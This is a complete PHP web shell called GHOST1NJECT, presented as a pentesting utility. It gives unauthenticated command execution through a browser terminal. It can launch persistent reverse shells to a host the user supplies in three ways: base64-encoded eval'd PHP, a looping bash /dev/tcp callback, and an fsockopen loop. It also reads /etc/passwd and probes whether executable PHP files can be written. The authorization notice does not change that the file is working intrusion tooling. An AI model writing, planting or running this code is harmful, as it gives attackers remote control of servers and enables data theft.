<?php
/*
 * ============================================================================
 *  GHOST1NJECT
 *  Linux PHP Terminal + Evidence Panel
 * ============================================================================
 *
 *  Version     : 1.6
 *  Author      : Lucas Diniz
 *  Organization: Prodigium Academy
 *
 *  Description :
 *  Single-file PHP utility designed to support authorized penetration testing,
 *  security assessments and controlled cybersecurity laboratory activities.
 *
 *  Features    :
 *  - Stateful web terminal
 *  - System and environment information
 *  - Filesystem and upload capability assessment
 *  - Extension write probes
 *  - Shell / payload capability diagnostics
 *  - Persistent reverse callback with PTY/pipe fallback handling
 *
 *  Purpose     :
 *  Developed as a supporting utility for technical validation, evidence
 *  collection and reproducible security testing in authorized environments.
 *
 *  NOTICE      :
 *  This tool is intended exclusively for systems and environments for which
 *  explicit authorization to perform security testing has been granted.
 *
 * ============================================================================
 */

error_reporting(0);
session_start();

function h($v){ return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8'); }
function yn($v){ return $v ? '<span class="green">YES</span>' : '<span class="red">NO</span>'; }

function disabled_set(){
    $raw = trim((string)ini_get('disable_functions'));
    if ($raw === '') return [];
    return array_fill_keys(array_filter(array_map('trim', preg_split('/[,\s]+/', $raw))), true);
}
function callable_ok($f, $dis){ return is_callable($f) && !isset($dis[$f]); }
function bin_path($names){
    foreach ((array)$names as $n) foreach (['/bin/','/usr/bin/','/usr/local/bin/','/sbin/','/usr/sbin/'] as $p) if (@is_executable($p.$n)) return $p.$n;
    return false;
}
function level($n,$max){ return $n<=0?'NONE':($n<$max/2?'LOW':($n<$max?'MEDIUM':'HIGH')); }

function php_binary(){
    $php = bin_path('php');
    if ($php) return $php;
    if (function_exists('exec') && !isset(disabled_set()['exec'])) {
        $out = @exec('which php 2>/dev/null');
        if ($out && @is_executable($out)) return $out;
    }
    return false;
}

$base = getcwd() ?: '.';
if (empty($_SESSION['cwd']) || !is_dir($_SESSION['cwd'])) $_SESSION['cwd'] = $base;

// Stateful web terminal
if (isset($_POST['cmd'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    $cmd = trim((string)$_POST['cmd']);
    if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
    if ($cmd !== '') {
        $_SESSION['history'][] = $cmd;
        if (count($_SESSION['history']) > 100) array_shift($_SESSION['history']);
    }

    if (preg_match('/^cd(?:\s+(.*))?$/s', $cmd, $m)) {
        $arg = isset($m[1]) ? trim($m[1], " \t\n\r\0\x0B\"'") : '';
        if ($arg === '' || $arg === '~') $arg = getenv('HOME') ?: $_SESSION['cwd'];
        elseif ($arg === '-') $arg = $_SESSION['prev_cwd'] ?? $_SESSION['cwd'];
        elseif ($arg[0] !== '/') $arg = rtrim($_SESSION['cwd'], '/') . '/' . $arg;
        $new = @realpath($arg);
        if ($new && is_dir($new) && @is_readable($new)) {
            $_SESSION['prev_cwd'] = $_SESSION['cwd'];
            $_SESSION['cwd'] = $new;
            echo $new;
        } else echo 'cd: directory unavailable';
        exit;
    }

    @chdir($_SESSION['cwd']);
    if ($cmd === 'pwd') { echo getcwd() ?: $_SESSION['cwd']; exit; }
    $output = function_exists('shell_exec') ? @shell_exec($cmd . ' 2>&1') : null;
    if ($output === null || $output === '') {
        foreach (['/bin/sh','/bin/bash','/usr/bin/bash'] as $sh) {
            if (is_executable($sh) && function_exists('shell_exec')) {
                $output = @shell_exec($sh . ' -c ' . escapeshellarg($cmd) . ' 2>&1');
                if ($output !== null && $output !== '') break;
            }
        }
    }
    echo $output ?: '[no output]';
    exit;
}

if (isset($_GET['clear'])) { $_SESSION['history'] = []; exit; }

// ============================================================
// REVERSE SHELL v1.6 – COM CORREÇÕES DE FALLBACK E EOF
// ============================================================
if (isset($_POST['rev_host'], $_POST['rev_port'])) {
    $host = trim((string)$_POST['rev_host']);
    $port = (int)$_POST['rev_port'];
    $validHost = filter_var($host, FILTER_VALIDATE_IP) || preg_match('/^(?=.{1,253}$)[A-Za-z0-9](?:[A-Za-z0-9.-]*[A-Za-z0-9])?$/', $host);
    if (!$validHost || $port < 1 || $port > 65535) { echo 'FAIL'; exit; }

    $dis = disabled_set();
    $success = false;
    $execOk = function_exists('exec') && !isset($dis['exec']);
    $phpBin = php_binary();
    $fsockopenOk = function_exists('fsockopen') && !isset($dis['fsockopen']);
    $procOpenOk = function_exists('proc_open') && !isset($dis['proc_open']);
    $shellFound = false;
    foreach (['/bin/bash','/bin/sh','/usr/bin/bash','/usr/bin/sh','/bin/dash'] as $s) {
        if (@is_executable($s)) { $shellFound = $s; break; }
    }

    // -----------------------------
    // MÉTODO 1: proc_open com PHP CLI (precisa: exec, php, fsockopen, proc_open, shell)
    // -----------------------------
    if (!$success && $execOk && $phpBin && $fsockopenOk && $procOpenOk && $shellFound) {
        $payloadCode = <<<'EOP'
$host = 'HOST';
$port = PORT;

set_time_limit(0);
ignore_user_abort(true);

$sock = @fsockopen($host, $port, $errno, $errstr, 30);
if (!$sock) exit(1);

$shells = ['/bin/bash','/bin/sh','/usr/bin/bash','/usr/bin/sh','/bin/dash','/usr/bin/dash'];
$shell = false;
foreach ($shells as $s) {
    if (@is_executable($s)) { $shell = $s; break; }
}
if (!$shell) {
    fwrite($sock, "No shell found\n");
    fclose($sock);
    exit(1);
}

// Tenta PTY, mas se falhar, usa pipes
$usePty = function_exists('proc_open') && defined('STDIN') && @is_file('/dev/ptmx');
if ($usePty) {
    $descriptorspec = [
        0 => ['pty'],
        1 => ['pty'],
        2 => ['pty']
    ];
} else {
    $descriptorspec = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
}

$process = @proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    // fallback para pipes normais
    $usePty = false;  // IMPORTANTE: agora não é mais PTY
    $descriptorspec = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
    $process = @proc_open($shell, $descriptorspec, $pipes);
}
if (!is_resource($process)) {
    fwrite($sock, "proc_open failed\n");
    fclose($sock);
    exit(1);
}

stream_set_blocking($sock, false);
foreach ($pipes as $pipe) {
    stream_set_blocking($pipe, false);
}

$writeBuf = '';
$stdinBuf = '';

$readBase = [$sock, $pipes[1]];
if (!$usePty) {
    $readBase[] = $pipes[2];
}
$writeSet = [];

while (true) {
    $r = $readBase;
    $w = $writeSet;
    $e = [];
    if (stream_select($r, $w, $e, 1) === false) break;

    // --- Dados do socket -> stdin do shell ---
    if (in_array($sock, $r)) {
        $data = @fread($sock, 8192);
        if ($data === false) break; // erro
        if ($data === '') {
            // Verifica se é EOF (socket fechado)
            if (feof($sock)) break;
            // Caso contrário, ignora (leitura vazia em não-bloqueante)
        } else {
            $stdinBuf .= $data;
            $writeSet[] = $pipes[0];
        }
    }

    // --- Escrita no stdin do shell ---
    if (in_array($pipes[0], $w) && $stdinBuf !== '') {
        $written = @fwrite($pipes[0], $stdinBuf);
        if ($written === false) break;
        if ($written > 0) $stdinBuf = substr($stdinBuf, $written);
        if ($stdinBuf === '') {
            $writeSet = array_diff($writeSet, [$pipes[0]]);
        }
    }

    // --- Leitura do stdout (e stderr se não for PTY) ---
    if (in_array($pipes[1], $r)) {
        $data = @fread($pipes[1], 8192);
        if ($data === false) break;
        if ($data !== '') {
            $writeBuf .= $data;
            $writeSet[] = $sock;
        }
    }
    if (!$usePty && in_array($pipes[2], $r)) {
        $data = @fread($pipes[2], 8192);
        if ($data === false) break;
        if ($data !== '') {
            $writeBuf .= $data;
            $writeSet[] = $sock;
        }
    }

    // --- Escrita no socket ---
    if (in_array($sock, $w) && $writeBuf !== '') {
        $written = @fwrite($sock, $writeBuf);
        if ($written === false) break;
        if ($written > 0) $writeBuf = substr($writeBuf, $written);
        if ($writeBuf === '') {
            $writeSet = array_diff($writeSet, [$sock]);
        }
    }

    // Verifica se o processo ainda está vivo
    $status = @proc_get_status($process);
    if (!$status || !$status['running']) break;

    usleep(10000);
}

foreach ($pipes as $pipe) fclose($pipe);
@proc_close($process);
@fclose($sock);
EOP;

        $payloadCode = str_replace(['HOST', 'PORT'], [$host, $port], $payloadCode);
        $payload = base64_encode($payloadCode);
        @exec("{$phpBin} -r \"eval(base64_decode('$payload'));\" > /dev/null 2>&1 &");
        $success = true;
    }

    // -----------------------------
    // MÉTODO 2: bash /dev/tcp (precisa: exec, bash, /dev/tcp suportado)
    // -----------------------------
    if (!$success && $execOk && $shellFound && strpos($shellFound, 'bash') !== false) {
        $cmd = "{$shellFound} -c 'while :; do exec 5<>/dev/tcp/{$host}/{$port}; cat <&5 | while read line; do \$line 2>&5 >&5; done; sleep 10; done' 2>/dev/null &";
        @exec($cmd);
        $success = true;
    }

    // -----------------------------
    // MÉTODO 3: fsockopen + shell_exec (precisa: exec, php, fsockopen, shell_exec)
    // -----------------------------
    if (!$success && $execOk && $phpBin && $fsockopenOk && function_exists('shell_exec') && !isset($dis['shell_exec'])) {
        $payload = base64_encode('set_time_limit(0);$h="'.$host.'";$p='.$port.';while(1){$s=@fsockopen($h,$p,$e,$e,30);if($s){stream_set_timeout($s,120);while(!feof($s)){$c=fgets($s);if($c===false)break;$o=shell_exec($c);fwrite($s,$o===null?"[error]\\n":$o);}fclose($s);}sleep(10);}');
        @exec("{$phpBin} -r \"eval(base64_decode('$payload'));\" > /dev/null 2>&1 &");
        $success = true;
    }

    echo $success ? 'OK' : 'FAIL';
    exit;
}

// ============================================================
// PAINEL DE EVIDÊNCIAS (INALTERADO)
// ============================================================
function shell_users() {
    $out = [];
    if (@is_readable('/etc/passwd')) foreach (@file('/etc/passwd') ?: [] as $line) {
        $p = explode(':', $line);
        if (count($p) >= 7 && in_array(trim($p[6]), ['/bin/bash','/bin/sh','/bin/zsh','/bin/dash','/usr/bin/bash','/usr/bin/zsh'])) $out[] = h($p[0]);
    }
    return $out ? implode('<br>', $out) : '<span class="red">Unavailable</span>';
}

function write_probe($dir) {
    $r = ['writable'=>@is_writable($dir),'create'=>false,'delete'=>false,'ext'=>[]];
    $tag = '.ghost_probe_' . substr(md5(uniqid('', true)), 0, 8);
    $p = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $tag;
    if (@file_put_contents($p, "GHOST_WRITE_PROBE\n") !== false) {
        $r['create'] = true; $r['delete'] = @unlink($p);
    }
    foreach (['php','phtml','phar'] as $ext) {
        $f = $p . '.' . $ext;
        $ok = @file_put_contents($f, "GHOST_EXTENSION_WRITE_PROBE\n") !== false;
        $r['ext'][$ext] = $ok;
        if ($ok) @unlink($f);
    }
    return $r;
}

@chdir($_SESSION['cwd']);
$cwd = getcwd() ?: $_SESSION['cwd'];
$os = php_uname() ?: 'Linux';
$user = function_exists('exec') ? @exec('whoami') : '';
if (!$user) $user = get_current_user();
$phpver = phpversion();
$serv = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
$hostname = gethostname() ?: 'unknown';
$disabled = ini_get('disable_functions') ?: 'none';
$dis = disabled_set();
$docroot = $_SERVER['DOCUMENT_ROOT'] ?? 'unknown';
$probe = write_probe($cwd);
$perm = @fileperms($cwd); $perm = $perm ? substr(sprintf('%o', $perm), -4) : 'N/A';
$uploads = filter_var(ini_get('file_uploads'), FILTER_VALIDATE_BOOLEAN);
$tmpdir = ini_get('upload_tmp_dir') ?: sys_get_temp_dir();
$anyRiskExt = in_array(true, $probe['ext'], true);
$risk = !$probe['create'] ? 'LOW' : ($anyRiskExt ? 'HIGH*' : 'MEDIUM');

$execNames = ['system','exec','popen','passthru','shell_exec','proc_open'];
$execCap = []; foreach ($execNames as $f) $execCap[$f] = callable_ok($f,$dis);
$transportCap = [
    'fsockopen'=>callable_ok('fsockopen',$dis),
    'sockets'=>extension_loaded('sockets') && callable_ok('socket_create',$dis),
    'stream_socket'=>callable_ok('stream_socket_client',$dis),
    'stream_select'=>callable_ok('stream_select',$dis)
];
$shellCap = [
    'bash'=>bin_path('bash'), 'sh'=>bin_path('sh'), 'python3'=>bin_path('python3'),
    'script'=>bin_path('script'), 'socat'=>bin_path('socat')
];
$execN = count(array_filter($execCap)); $transN = count(array_filter($transportCap));
$ptyN = (int)(bool)$shellCap['python3'] + (int)(bool)$shellCap['script'] + (int)(bool)$shellCap['socat'];
$execLevel = level($execN,count($execCap)); $transportLevel = level($transN,count($transportCap));
$interactiveLevel = $ptyN>=2?'MEDIUM':($ptyN===1?'LOW':'NONE');
$overall = ($execN && $transN) ? (($execN>=4 && $transN>=3)?'HIGH':'MEDIUM') : ($execN?'LOW':'NONE');
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><title>GHOST1NJECT | Linux Terminal + Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0e0a;color:#0f0;font:13px 'Courier New',monospace;height:100vh;display:flex;flex-direction:column}.hdr,.banner{background:#1a1e1a;padding:6px 12px;border-bottom:1px solid #0f0}.hdr{display:flex;justify-content:space-between}.banner{text-align:center}.main{display:flex;flex:1;overflow:hidden}.termwrap{flex:2;display:flex;flex-direction:column;border-right:1px solid #0f0}.term{flex:1;overflow:auto;padding:10px;white-space:pre-wrap;word-break:break-all}.promptrow{display:flex;gap:8px;padding:8px 12px;border-top:1px solid #0f0}.cmd{flex:1;background:transparent;border:0;color:#0f0;font:13px 'Courier New';outline:0}.panelwrap{flex:1;overflow:auto}.panel{padding:12px}h3{font-size:14px;border-bottom:1px solid #0f0;padding-bottom:4px}h4{color:#ff0;margin:13px 0 5px;font-size:12px}.item{font-size:11px;margin:3px 0;word-break:break-all}.box{background:#1a1e1a;padding:8px;margin:10px 0;border-left:3px solid #0f0}button,input{background:#1a1e1a;color:#0f0;border:1px solid #0f0;padding:5px 8px}button{cursor:pointer}.panel input,.panel button{width:100%;margin-bottom:7px}.green{color:#0f0}.red{color:#f66}.yellow{color:#ff0}.muted{color:#aaa}.line{margin-bottom:2px}.status{font-size:11px}
</style></head><body>
<div class="banner"><span class="green">[+] GHOST1NJECT v1.6</span> | <span class="yellow">Linux Terminal + Panel</span> | <span class="green">PTY fix + EOF detection</span></div>
<div class="hdr"><span>ghost1nject@<?=h($hostname)?></span><span class="status">ONLINE | <?=h($user)?></span></div>
<div class="main"><div class="termwrap"><div class="term" id="terminal">
<div class="line">[+] GHOST1NJECT v1.6</div><div class="line">[+] System: <?=h($os)?></div><div class="line">[+] User: <?=h($user)?></div><div class="line" id="cwdLine">[+] Directory: <?=h($cwd)?></div><div class="line">[+] PHP: <?=h($phpver)?></div><div class="line">---</div><div class="line">[*] Reverse shell com PTY (fallback para pipes) e detecção de EOF</div><div class="line">[*] Use 'revshell IP PORT' ou botão no painel</div><div class="line">---</div>
</div><div class="promptrow"><span>$&gt;</span><input id="cmdInput" class="cmd" autofocus autocomplete="off"><button id="clearBtn">Clear</button></div></div>
<div class="panelwrap"><div class="panel"><h3>[#] REVERSE SHELL</h3><div class="box"><div>[*] Listener:</div><div class="yellow">nc -lvnp 4444</div></div><input id="revHost" placeholder="Your IP"><input id="revPort" placeholder="Port"><button id="startRevBtn">[+] START REVERSE SHELL</button><div id="revMsg" class="item"></div>
<h4>[+] SYSTEM INFO</h4><div class="item"><span class="yellow">OS:</span> <?=h($os)?></div><div class="item"><span class="yellow">Hostname:</span> <?=h($hostname)?></div><div class="item"><span class="yellow">User:</span> <?=h($user)?></div><div class="item"><span class="yellow">Directory:</span> <?=h($cwd)?></div><div class="item"><span class="yellow">PHP:</span> <?=h($phpver)?></div><div class="item"><span class="yellow">Server:</span> <?=h($serv)?></div><div class="item"><span class="yellow">disable_functions:</span> <?=h($disabled)?></div>
<h4>[+] FILESYSTEM / UPLOAD</h4><div class="item"><span class="yellow">Writable:</span> <?=yn($probe['writable'])?></div><div class="item"><span class="yellow">Create:</span> <?=yn($probe['create'])?> <span class="yellow">Delete:</span> <?=yn($probe['delete'])?></div><div class="item"><span class="yellow">Permissions:</span> <?=h($perm)?></div><div class="item"><span class="yellow">Document root:</span> <?=h($docroot)?></div><div class="item"><span class="yellow">file_uploads:</span> <?=yn($uploads)?></div><div class="item"><span class="yellow">upload_tmp_dir:</span> <?=h($tmpdir)?></div><div class="item"><span class="yellow">upload_max:</span> <?=h(ini_get('upload_max_filesize'))?> / POST <?=h(ini_get('post_max_size'))?></div><div class="item"><span class="yellow">open_basedir:</span> <?=h(ini_get('open_basedir') ?: 'none')?></div>
<h4>[+] EXTENSION WRITE PROBE</h4><?php foreach($probe['ext'] as $e=>$ok): ?><div class="item"><span class="yellow">.<?=h($e)?>:</span> <?=yn($ok)?></div><?php endforeach; ?><div class="item"><span class="yellow">Write exposure:</span> <b><?=h($risk)?></b></div><div class="item muted">* Extension creation only; server-side execution is not tested.</div>
<h4>[+] SHELL / PAYLOAD CAPABILITY</h4><div class="item"><span class="yellow">EXEC:</span> <?php foreach($execCap as $n=>$ok): ?><span title="<?=h($n)?>"><?=h($n)?>=<?=strip_tags(yn($ok))?> </span><?php endforeach; ?></div><div class="item"><span class="yellow">Execution:</span> <b><?=h($execLevel)?></b></div><div class="item"><span class="yellow">TRANSPORT:</span> <?php foreach($transportCap as $n=>$ok): ?><?=h($n)?>=<?=strip_tags(yn($ok))?> <?php endforeach; ?></div><div class="item"><span class="yellow">Transport:</span> <b><?=h($transportLevel)?></b></div><div class="item"><span class="yellow">SHELL:</span> <?php foreach($shellCap as $n=>$p): ?><?=h($n)?>=<?=strip_tags(yn((bool)$p))?> <?php endforeach; ?></div><div class="item"><span class="yellow">PTY candidates:</span> <?=h(implode(', ',array_keys(array_filter($shellCap,function($v,$k){return $v && in_array($k,['python3','script','socat']);},ARRAY_FILTER_USE_BOTH))) ?: 'none')?></div><div class="item"><span class="yellow">Interactive:</span> <b><?=h($interactiveLevel)?></b> <span class="yellow">Overall:</span> <b><?=h($overall)?></b></div><div class="item muted">Capability only; no outbound connectivity or PTY execution is attempted.</div>
<h4>[+] USERS WITH SHELL</h4><div class="item"><?=shell_users()?></div></div></div></div>
<script>
const t=document.getElementById('terminal'),i=document.getElementById('cmdInput');let hist=[],hi=-1;function esc(s){return s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}function line(s,e=0){let d=document.createElement('div');d.className='line';d.style.color=e?'#f66':'#0f0';d.innerHTML=s;t.appendChild(d);t.scrollTop=t.scrollHeight}async function post(o){let f=new FormData();Object.keys(o).forEach(k=>f.append(k,o[k]));return(await fetch('',{method:'POST',body:f})).text()}async function run(c){if(!c.trim())return;line('&gt; '+esc(c));if(c.toLowerCase().startsWith('revshell ')){let p=c.trim().split(/\s+/);if(p.length<3)return line('[-] Usage: revshell IP PORT',1);let r=await post({rev_host:p[1],rev_port:p[2]});line(r==='OK'?'[+] Reverse callback launched':'[-] Failed to launch callback',r!=='OK');return}try{let o=await post({cmd:c});o.split('\n').forEach(x=>line(esc(x)));if(/^cd(?:\s|$)/.test(c)&&o&&!o.startsWith('cd:'))document.getElementById('cwdLine').innerHTML='[+] Directory: '+esc(o)}catch(e){line('Error: '+esc(e.message),1)}line('')}
i.onkeydown=e=>{if(e.key==='Enter'){let c=i.value;i.value='';if(c.trim()){hist.unshift(c);hist=hist.slice(0,50);hi=-1;run(c)}}else if(e.key==='ArrowUp'){e.preventDefault();if(hi+1<hist.length)i.value=hist[++hi]}else if(e.key==='ArrowDown'){e.preventDefault();if(hi>0)i.value=hist[--hi];else if(hi===0){hi=-1;i.value=''}}};document.getElementById('clearBtn').onclick=()=>{fetch('?clear=1');t.innerHTML='';line('[+] Terminal cleared.');line('')};document.getElementById('startRevBtn').onclick=async()=>{let h=document.getElementById('revHost').value,p=document.getElementById('revPort').value,m=document.getElementById('revMsg');if(!h||!p){m.innerHTML='<span class="red">[-] Enter IP and port</span>';return}m.textContent='[*] Launching callback...';let r=await post({rev_host:h,rev_port:p});m.innerHTML=r==='OK'?'<span class="green">[+] Callback launched. Keep listener open.</span>':'<span class="red">[-] Failed to launch callback</span>'};i.focus();
</script></body></html>
